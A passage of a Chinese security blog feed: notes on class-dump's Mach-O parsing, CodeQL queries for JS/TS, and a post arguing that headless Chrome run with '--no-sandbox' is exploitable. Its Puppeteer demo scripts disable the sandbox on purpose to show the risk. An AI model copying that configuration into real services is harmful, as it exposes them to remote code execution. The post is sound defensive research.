readInt32];</span><br><span class="line">objc2Protocol.extendedMethodTypes     = 0;</span><br></pre></td></tr></table></figure><p>name protocols这些字段是一个地址，指向对应的值(字符串/数组)</p><p>最后参照objc2Protocol的值，分别获取protocol 的 name， 各种methods，属性等，初始化了protocol对象</p><p>所以protocols就都处理出来了，最后得到了</p><p><code>_protocolsByAddress __NSDictionaryM *   6781 key/value pairs    0x0000000112f93820</code></p><h2 id="4-protocolUniquer-createUniquedProtocols"><a href="#4-protocolUniquer-createUniquedProtocols" class="headerlink" title="4. protocolUniquer createUniquedProtocols"></a>4. protocolUniquer createUniquedProtocols</h2><p>依赖3中找到的 <code>_protocolsByAddress</code></p><p>name -&gt; protocol 对应关系的dict addr -&gt; protocol 对应关系的dict</p><p>p1-&gt;protocols 里还有protocol，merge进来(adopted protocols)</p><ul><li><p>p1 : _name   __NSCFString *  @”AWEFriendsActivityWidgetConfigurationIntentHandling”  0x0000000112fbc710</p></li><li><p>p2 : _name   NSTaggedPointerString * @”NSObject” 0x07518ee6ed78d7f9</p></li></ul><p>@interface AWEFriendsActivityWidgetConfigurationIntentHandling : NSObject { //blablabla… }</p><p>这种情况</p><h2 id="5-loadClasses"><a href="#5-loadClasses" class="headerlink" title="5. loadClasses"></a>5. loadClasses</h2><p>解析section ：<code> __DATA   __objc_classlist</code></p><p>和3类似的套路，先得到 一个 地址，然后根据地址，去文件中索引对应的结构：</p><p><code>CDOCClass *aClass = [self loadClassAtAddress:val]</code></p><p>只调试一次过程分析即可:<code> val uint64_t    4335166480 In [2]: hex(4335166480) Out[2]: &#39;0x102656410&#39;</code></p><p>这个0x102656410，使用machoview也能看到，调试+machoview对比看，更容易理解。</p><p><code>loadClassAtAddress</code>方法分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_class objc2Class;</span><br><span class="line">objc2Class.isa        = [cursor readPtr];</span><br><span class="line">objc2Class.superclass = [cursor readPtr];</span><br><span class="line">objc2Class.cache      = [cursor readPtr];</span><br><span class="line">objc2Class.vtable     = [cursor readPtr];</span><br><span class="line">objc2Class.data       = [cursor readPtr];</span><br><span class="line">objc2Class.reserved1  = [cursor readPtr];</span><br><span class="line">objc2Class.reserved2  = [cursor readPtr];</span><br><span class="line">objc2Class.reserved3  = [cursor readPtr];</span><br></pre></td></tr></table></figure><p>也是读取对应的class结构，这个过程其实很眼熟，如果读过iOS逆向的书，比如庆神的书，有一章介绍oc方法调用过程的，会把oc-&gt;cpp代码，那里面这个 oc object的结构分析的很清楚。</p><p>然后解析<code> class-&gt;data</code> 字段</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cd_objc2_class_ro_t objc2ClassData;</span><br><span class="line">objc2ClassData.flags         = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceStart = [cursor readInt32];</span><br><span class="line">objc2ClassData.instanceSize  = [cursor readInt32];</span><br><span class="line"><span class="keyword">if</span> ([<span class="keyword">self</span>.machOFile uses64BitABI])</span><br><span class="line">    objc2ClassData.reserved  = [cursor readInt32];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    objc2ClassData.reserved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">objc2ClassData.ivarLayout     = [cursor readPtr];</span><br><span class="line">objc2ClassData.name           = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseMethods    = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProtocols  = [cursor readPtr];</span><br><span class="line">objc2ClassData.ivars          = [cursor readPtr];</span><br><span class="line">objc2ClassData.weakIvarLayout = [cursor readPtr];</span><br><span class="line">objc2ClassData.baseProperties = [cursor readPtr];</span><br></pre></td></tr></table></figure><p>然后得到class 的 name，methods，protocol, property信息 然后返回这个class</p><p>展开说下 获取 methods &amp;&amp; property的时候</p><ul><li><code>(NSArray *)loadMethodsAtAddress:(uint64_t)address; &#123; return [self loadMethodsAtAddress:address extendedMethodTypesCursor:nil]; &#125;</code></li></ul><p><code>loadMethodsAtAddress :</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">objc2Method.name  = [cursor readPtr];</span><br><span class="line">objc2Method.types = [cursor readPtr];</span><br><span class="line">objc2Method.imp   = [cursor readPtr];</span><br><span class="line">NSString *name    = [self.machOFile stringAtAddress:objc2Method.name];</span><br><span class="line">NSString *types   = [self.machOFile stringAtAddress:objc2Method.types];</span><br></pre></td></tr></table></figure><p>一样的套路，都是解析出来对应的字段，然后按照这些字段读取信息<code>(string) CDOCMethod *method = [[CDOCMethod alloc] initWithName:name typeString:types address:objc2Method.imp]; [methods addObject:method]; </code>最后获得methods数组，给前面填充class的地方使用</p><p><code>loadIvarsAtAddress ,loadPropertiesAtAddress , loadMethodsOfMetaClassAtAddress</code> 同理</p><p>至此，class解析完毕</p><h2 id="6-loadCategories"><a href="#6-loadCategories" class="headerlink" title="6. loadCategories"></a>6. loadCategories</h2><p>关于Categories 可以看 <a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p><p>处理<code> __DATA __objc_catlist section</code> : </p><ul><li>(CDOCCategory *)loadCategoryAtAddress:(uint64_t)address;</li></ul><p>一样的处理方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct cd_objc2_category objc2Category;</span><br><span class="line">objc2Category.name               = [cursor readPtr];</span><br><span class="line">objc2Category.class              = [cursor readPtr];</span><br><span class="line">objc2Category.instanceMethods    = [cursor readPtr];</span><br><span class="line">objc2Category.classMethods       = [cursor readPtr];</span><br><span class="line">objc2Category.protocols          = [cursor readPtr];</span><br><span class="line">objc2Category.instanceProperties = [cursor readPtr];</span><br><span class="line">objc2Category.v7                 = [cursor readPtr];</span><br><span class="line">objc2Category.v8                 = [cursor readPtr];</span><br></pre></td></tr></table></figure><p>可以看到和对objc2Class的处理有点像，就是因为是category的原因，所以字段有不同， 简单的理解成 处理一种特殊的class，并且提取出相应的 methods 和 properties就行</p><p>至此整个 process函数的处理结束</p><h2 id="7-处理-or-输出"><a href="#7-处理-or-输出" class="headerlink" title="7. 处理 or 输出"></a>7. 处理 or 输出</h2><p>这部分主要是处理输出了，如果没什么参数就直接stdout输出，如果有指定文件目录，就遍历之前process得到的信息，写文件(.h)到指定的目录。</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/output.png" alt="output"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/24925196">https://zhuanlan.zhihu.com/p/24925196</a></p><p><a href="https://en.wikipedia.org/wiki/Mach-O">https://en.wikipedia.org/wiki/Mach-O</a></p><p><a href="https://iosre.com/">https://iosre.com/</a></p><p><a href="https://evilpan.com/2020/09/06/macho-inside-out/">https://evilpan.com/2020/09/06/macho-inside-out/</a></p><p>iOS应用逆向与安全 (刘培庆著)</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;roadmap&quot;&gt;&lt;a href=&quot;#roadmap&quot; class=&quot;headerlink&quot; title=&quot;roadmap&quot;&gt;&lt;/a&gt;roadmap&lt;/h1&gt;&lt;p&gt;之前在 &lt;a href=&quot;https://iosre.com/&quot;&gt;iosre&lt;/a&gt;看到一张比较系统的iOS逆向学习路线图，因为接触过一段时间macOS上服务的漏洞挖掘，所以对*OS安全还是挺有兴趣的，也一直想系统性地学习下iOS逆向，之前的一直不成体系，也很零碎，正好对着这个图重构下知识体系。&lt;/p&gt;</summary>
    
    
    
    <category term="iOS" scheme="http://o0xmuhe.me/categories/iOS/"/>
    
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
    <category term="逆向" scheme="http://o0xmuhe.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL JS/TS Journey</title>
    <link href="http://o0xmuhe.me/2021/06/01/CodeQL-JS-TS-Journey/"/>
    <id>http://o0xmuhe.me/2021/06/01/CodeQL-JS-TS-Journey/</id>
    <published>2021-06-01T03:43:11.000Z</published>
    <updated>2021-06-09T14:33:55.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>之前做过的一些使用CodeQL对JS/TS项目做扫描的笔记。</p><a id="more"></a><h1 id="关于构建数据库过程"><a href="#关于构建数据库过程" class="headerlink" title="关于构建数据库过程"></a>关于构建数据库过程</h1><p>对于JS/TS的项目来说，CodeQL统一都是 <code>--language=javascript</code> 的参数处理的，而且它主要是扫描，解析，然后构建数据库，对于小项目直接默认参数应该是ok的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=javascript &lt;your_prj&gt;</span><br><span class="line"><span class="comment"># codeql database bundle -o &lt;your_prj_db&gt;.zip &lt;your_prj&gt;</span></span><br></pre></td></tr></table></figure><p>但是对于比较大型的项目来说，因为CodeQL是Java写的，所以可能会存在内存不足导致构建数据库失败的情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FATAL ERROR: Ineffective mark-compacts near heap <span class="built_in">limit</span> Allocation failed -</span><br><span class="line">JavaScript heap out of memory</span><br></pre></td></tr></table></figure><p>默认给的内存是<code>2400MB</code>，大项目必然不够啊，文件太多了。</p><p>找了一圈没有解决方案，索性直接掏出JD_GUI把它的jar包给反编译了，发现是通过环境变量控制的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SEMMLE_TYPESCRIPT_RAM=8000</span><br></pre></td></tr></table></figure><p><strong>这个不是给JAVA的那个内存设置(<code>-J-Xmx1234M</code>)</strong></p><h1 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h1><h2 id="接口函数"><a href="#接口函数" class="headerlink" title="接口函数"></a>接口函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">interface FooInterface&#123;</span><br><span class="line">4&#x2F;&#x2F;...</span><br><span class="line">&#125;</span><br><span class="line">export interface outerApiConfig &#123;</span><br><span class="line"></span><br><span class="line">4foo: (params: xxxxx) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever ..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4bar: (params: FooInterface) &#x3D;&gt; Promise&lt;&#123; &#x2F;&#x2F; whatever..&#125;&gt;;</span><br><span class="line">4</span><br><span class="line">4&#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿这个Demo为例，很多接口函数统一导出，需要借助<code>InterfaceDeclaration</code> 来找，不过我的方法有点“笨”。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import javascript</span><br><span class="line"></span><br><span class="line">predicate isOuterAPIs(Function f)&#123;</span><br><span class="line">     exists(InterfaceDeclaration apis |</span><br><span class="line">         apis.getIdentifier().toString() = "outerApiConfig" and</span><br><span class="line">         apis.getAMember().getName() = f.getName()</span><br><span class="line">     )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where isOuterAPIs(f)</span><br><span class="line"><span class="keyword">select</span> f.getName()</span><br></pre></td></tr></table></figure><p>我这里实现很粗暴，就是限制函数名(字符串值)和Interface里成员名字(字符串值)一致，就认为这个函数是导出接口中的函数。</p><h2 id="特定参数的处理"><a href="#特定参数的处理" class="headerlink" title="特定参数的处理"></a>特定参数的处理</h2><p>在我的需求中，我需要重点关注，参数中带有路径的函数，换言之就是需要识别出这么多接口函数中，参数带有<code>path</code>的情况，那么很直接的思路就是利用正则，但是在实际的场景下，你会发现代码真的写出了“花”，不是常规的query能覆盖的。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">foo: <span class="function">(<span class="params">params: WTFParams</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;....&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bar: <span class="function">(<span class="params">params: &#123; arg: <span class="built_in">string</span> &#125;</span>) =&gt;</span> <span class="built_in">Promise</span>&lt;&#123; ...&#125;&gt;;</span><br><span class="line">                                           </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">magic</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>参数是一个interface，你需要对这个interface再限制，即这个interface的成员是不是path</p></li><li><p>参数直接就是 {arg : string} 这类情况</p></li><li><p>奇怪的函数写法，函数体在return里</p></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class PathParamInterfaceType extends InterfaceType&#123;</span><br><span class="line">    PathParamInterfaceType()&#123;</span><br><span class="line">        getInterface().getAMember().getName().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isParamPath(Function f)&#123;</span><br><span class="line">    (</span><br><span class="line">        f.getAParameter().getType() instanceof PathParamInterfaceType</span><br><span class="line">        or</span><br><span class="line">        f.getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    ) or</span><br><span class="line">    (</span><br><span class="line">        f.getNumParameter() = 0</span><br><span class="line">        and</span><br><span class="line">        f.getAReturnStmt().getExpr().(Function).getAParameter().getType().toString().toLowerCase().indexOf("path") &gt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="必须依赖TaintTracking吗"><a href="#必须依赖TaintTracking吗" class="headerlink" title="必须依赖TaintTracking吗"></a>必须依赖TaintTracking吗</h2><p>最后一个问题比较简单了，就是有了source，然后再找合适的sink，看有没有路径就行了；但是其实还有一种办法会来得更直接，就是利用传递闭包，但是会带来比较多的误报，好处是实现起来简单，想要排除误报，只需要增加限制即可，看具体需求吧，哪个方法合适用哪个。</p><p>CodeQL的JS/TS部分实现不如cpp多，所以有些predicate需要自己手动实现，比如用cpp做query可以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FunctionCall getFunctionToACall(FunctionCall fc)&#123;</span><br><span class="line">  result &#x3D; fc.getBasicBlock().getEnclosingFunction().getACallToThisFunction()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">        getFunctionToACall*(FunctionCall fc)</span><br></pre></td></tr></table></figure><p>但是JS/TS部分没有<code>getACallToThisFunction</code> ，根据原理，手动实现一个即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CallExpr getACallToThisFunction(Function f)&#123;</span><br><span class="line">    exists( CallExpr c |</span><br><span class="line">        c.getCalleeName() &#x3D; f.getName() and</span><br><span class="line">        result &#x3D; c</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CallExpr getFunctionToACall(CallExpr call)&#123;</span><br><span class="line">    result &#x3D; getACallToThisFunction(call.getEnclosingFunction())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，如果想要查询foo函数的传递闭包，就可以：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from CallExpr <span class="keyword">call</span></span><br><span class="line"><span class="keyword">where</span> call.getCalleeName() = <span class="string">"foo"</span></span><br><span class="line"><span class="keyword">select</span> getFunctionToACall*(<span class="keyword">call</span>)</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7482">https://xz.aliyun.com/t/7482</a></p><p><a href="https://securitylab.github.com/tools/codeql">CodeQL for research</a></p><p><a href="https://ctftime.org/writeup/22177">https://ctftime.org/writeup/22177</a></p><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md">https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md</a></p><p><a href="https://codeql.github.com/docs/codeql-cli/">https://codeql.github.com/docs/codeql-cli/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;关于&quot;&gt;&lt;a href=&quot;#关于&quot; class=&quot;headerlink&quot; title=&quot;关于&quot;&gt;&lt;/a&gt;关于&lt;/h1&gt;&lt;p&gt;之前做过的一些使用CodeQL对JS/TS项目做扫描的笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://o0xmuhe.me/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>Exploit Headless Chrome</title>
    <link href="http://o0xmuhe.me/2021/05/26/Chrome-headless-exploit/"/>
    <id>http://o0xmuhe.me/2021/05/26/Chrome-headless-exploit/</id>
    <published>2021-05-26T07:26:26.000Z</published>
    <updated>2021-06-23T09:53:13.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Chrome M59引入了 Headless Chrome，至此可以在无GUI的环境下使用Chrome，极大的方便了自动化测试工作，也可以用于预览服务，或者网络爬虫。</p><a id="more"></a><p>前端并不是我的强项，我在上网冲浪的时候发现一个很有趣的现象：</p><ol><li>很多技术文章相互参考，有些代码自然也直接复制粘贴使用</li><li>Headless Chrome自然也是这样，一些不好的编程习惯也被错误地传播</li></ol><p>于是有了本文，以及一些个人的思考。</p><h2 id="思考-🤔"><a href="#思考-🤔" class="headerlink" title="思考 🤔"></a>思考 🤔</h2><p>首先，在Google搜索Headless Chrome相关的技术文章，会跳出来官方文档以及各种技术文章:</p><p>(关键词顺序反了，不过不影响 XD )</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.41.22@2x.png" alt="CleanShot 2021-05-26 at 15.41.22@2x"></p><p>Headless Chrome其实就是从命令行启动Chrome，传递了<code>--headless</code>的参数，那么对于Chrome来说，有很多参数，但是有那么几个参数非常危险，比如 : <code>--no-sandbox</code>，<code>--disable-web-security</code>，以及开启调试端口…</p><p>在看了很多网上的文章后，我发现有不少代码是重复的（关键逻辑），比如这篇:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.47.37@2x.png" alt="CleanShot 2021-05-26 at 15.47.37@2x"></p><p>对于错误的参数也是一样的，比如不约而同地关闭sandbox:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(</span><br><span class="line">  &#123;<span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>或者调试端口不是 9222就是9229这类情况。 这里其实有几个问题：</p><ol><li>我使用的参数是什么意思？</li><li>这些参数对我的程序有什么影响？</li><li>这些参数安全吗？</li><li>什么情况下我可以用，什么情况下不能使用？</li></ol><p>如果搞不清楚，对于只是个人学习来说搞个demo那倒还好，如果说是用于实际项目，比如写预览服务，爬虫等项目，还是直接使用了这些危险的参数那就太危险了。</p><ol><li>线上环境要求稳定，不一定是最新版本node，即不一定是最新版本Chrome</li><li>危险的参数(比如<code>--disable-web-security</code>)，没有开启沙箱，开了调试端口等</li></ol><p><code>老版本Chrome + NOSANDBOX = RCE</code> 🤔</p><p>至此，我认为可以搞个Demo验证一下这个攻击思路是否可行。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Pages"><a href="#Pages" class="headerlink" title="Pages"></a>Pages</h3><p>这里直接扒了xlab某次安全推送，然后在本地跑起来，假装是一个目标网页：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.56.06@2x.png" alt="CleanShot 2021-05-26 at 15.56.06@2x"></p><p>下面搞两个场景吧，第一个是预览，简化一下，截图好了；第二个是爬虫，爬取这网页上的信息。</p><h3 id="Demo1-预览"><a href="#Demo1-预览" class="headerlink" title="Demo1 : 预览"></a>Demo1 : 预览</h3><p>预览的场景有很多，比如常见的IM中，发送的URL可能会被渲染成“卡片”，不同IM处理不一样，一般来说只有白名单才会这样。</p><p>我这边不会搞太复杂的东西，就直接用截图代替了，直接也从网上”东拼西凑“点代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    targetUrl = <span class="string">"https://www.google.com.hk"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>)</span><br><span class="line">        targetUrl = args[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome'</span>, </span><br><span class="line">                                            args: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(targetUrl);</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123; <span class="attr">path</span>: <span class="string">'res.png'</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>功能也比较简单，预览指定的网页，我这里搞得简单，直接截图然后保存，IM里那种卡片式不知道怎么搞，就没去尝试，不过也是个攻击面啦 🤣</p><p>跑一下Demo：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.57.20@2x.png" alt="CleanShot 2021-05-26 at 15.57.20@2x"></p><p>如果在页面里加载恶意的JS呢？</p><ul><li><p>直接使用script 标签加载</p></li><li><p>加入js，使用js web worker加载</p></li></ul><p>BOOM : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.59.02@2x.png" alt="CleanShot 2021-05-26 at 15.59.02@2x"></p><h3 id="Demo2-爬虫"><a href="#Demo2-爬虫" class="headerlink" title="Demo2 : 爬虫"></a>Demo2 : 爬虫</h3><p>这里直接抄了<a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> 里的代码:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ cat crawler.js </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome'</span>, <span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://localhost/foo.html'</span>, &#123;</span><br><span class="line">        waitUntil: <span class="string">'networkidle0'</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//count </span></span><br><span class="line">    <span class="keyword">let</span> eleCount = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">document</span>.getElementsByClassName(sel).length;</span><br><span class="line">    &#125;, <span class="string">'category'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(eleCount != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> htmlArray = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel, eleCount</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> element = <span class="built_in">document</span>.querySelectorAll(sel);</span><br><span class="line">            <span class="keyword">let</span> htmlArray = [];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= eleCount; i++)&#123;</span><br><span class="line">                htmlArray[i] = element[i].innerText;</span><br><span class="line">            &#125;</span><br><span class="line">            htmlArray.shift();</span><br><span class="line">            <span class="keyword">return</span> htmlArray;</span><br><span class="line">        &#125;, <span class="string">'p'</span>, eleCount);</span><br><span class="line">      <span class="built_in">console</span>.log(htmlArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   